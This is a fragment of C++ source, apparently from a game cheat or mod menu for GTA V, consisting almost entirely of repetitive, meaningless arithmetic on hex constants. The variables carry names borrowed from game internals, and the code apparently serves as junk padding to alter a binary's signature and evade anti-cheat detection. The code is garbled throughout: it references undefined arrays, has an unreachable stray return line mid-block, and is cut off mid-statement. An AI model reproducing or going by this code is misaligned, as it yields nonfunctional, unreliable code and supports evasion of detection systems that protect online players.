				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				return std::stoi(String::LerString(app, key));
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
